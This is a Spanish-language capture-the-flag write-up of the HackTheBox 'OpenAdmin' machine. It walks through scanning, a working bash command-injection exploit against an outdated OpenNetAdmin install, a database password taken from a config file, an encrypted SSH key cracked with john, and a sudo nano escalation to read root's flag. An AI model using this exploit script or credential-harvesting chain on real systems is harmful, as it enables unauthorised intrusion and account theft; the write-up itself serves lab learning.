---
layout: post
title: "OpenAdmin"
subtitle: 'HackTheBox - Easy Machine - Linux'
date: 2020-03-13 12:00:00
author: "TheusZero"
header-img: "images/post/OpenAdmin/OpenAdmin.png"
catalog: true
comments: true
tags:
  - Linux
  - Machine
  - Explotations
  - Upgrade
  - Shell
  - Root
  - User
---

# OpenAdmin

## Enumeracion

#### NMAP

```vim
┌─[zero@parrot]─[~/HTB/Machines/OpenAdmin]
└──╼ $nmap -sC -sV 10.10.10.171 -o nmap.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 19:32 EDT
Nmap scan report for 10.10.10.171
Host is up (0.35s latency).
Not shown: 997 closed ports
PORT    STATE    SERVICE        VERSION
22/tcp  open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp  open     http           Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
777/tcp filtered multiling-http
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.88 seconds
```

#### HTML  

parece ser una pagina de apache comun, asi que mandaremos un burpsuite y un gobuster a ver que podemos encontrar lo sgte:

![](/TheusZero/images/post/OpenAdmin/OpenAdmin1.png)

> gobuster dir -u "http://10.10.10.171/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dgobuster.txt
>> /music (Status: 301)
>
>> /artwork (Status: 301)
>
>> /sierra (Status: 301)

al entrar a la primera, nos encontramos con uan pag bastante particular y bonita, probe altiro en la parte del login y me mando a una pag llamada ona, donde se puede ver que esta en uan version desactualizada asi que supongo que podria haber algun exploit o algo por internet.

![](/TheusZero/images/post/OpenAdmin/OpenAdmin2.png)

![](/TheusZero/images/post/OpenAdmin/OpenAdmin3.png)

![](/TheusZero/images/post/OpenAdmin/OpenAdmin4.png)

claramente, hay un exploit para esa version, sin embargo no la saque de esa pag, probe con otra, dejo aqui el exploit

#### www-data

> Name.sh

```vim
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

> sh rce.sh http://10.10.10.171/ona/

listo, entre con una shell www-data

## Explotacion

lo primero que hice fue upgradear la shell, quedo la caga asi que no funciono.
con la shell no se podia hacer muxo, asi que luego de rebuscar un buen rato y preguntar a compares en HTB y el foro, logre encontrar un archivo bastante particular, obteniendo lo siguiente:

```vim
cat /opt/ona/www/local/config/database_settings.inc.php  

<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

> n1nj4W4rri0R!

se nota altiro que no necesita desifrarce, sin embargo no se donde habia que introducir esa passwoord, asi que enumere los usuarios obteniendo 2 principales:

> joanna

> jimmy

asi que me dispuse a probar con el ssh, para ver si obtenia suerte.

probe primero con joanna, pero nada (creo que no le gustaban los ninjas...)
pero con jimmy funciono de pana, asi que con el podemos proseguir con el escalado de privilegios.

## Privilage Escalation

Jimmy vale pico, no tiene sudo, no tiene acceso a nada wn asi que le mande unas cuantas enumeraciones y encontre lo siguiente:

```vim
jimmy@openadmin:/tmp/.no$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -   
```

probe con curl para ver que podia obtener, en cada uno y el puerto 52846 fue una sorpresa bro

```vim
jimmy@openadmin:/tmp/.no$ curl http://localhost:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```
ya hermano, se prendio esta mierda

use john y rockyou.txt para crackear esta shit, resulto en una password de la sgte manera:

```vim
┌─[zero@parrot]─[~/HTB/Machines/OpenAdmin]
└──╼ $/usr/share/john/ssh2john.py id_rsa.hash > hash_id_rsa
┌─[zero@parrot]─[~/HTB/Machines/OpenAdmin]
└──╼ $john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa.hash)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:04 DONE (2020-03-13 21:38) 0.2380g/s 3414Kp/s 3414Kc/s 3414KC/sa6_123..*7¡Vamos!
Session completed
```
> bloodninjas

asi que probremos con joanna ahoora que tal nos va

primero entramos por ssh con la id_rsa que tenemos y la clave que sacamos tambie, una vez dentro podemos leer el user.txt

ahora toca una enum.
Probe un :

> sudo -l

y sip, hay archivos que se pueden ejecutar como admin, esta vez fue nano, asi que abri ese archivo 

> sudo /bin/nano /opt/priv
 
y nano te deja leer archivos, asi que me meti a la carpeta /root/root.txt y era.

suscribanse JHFJASFHASJK
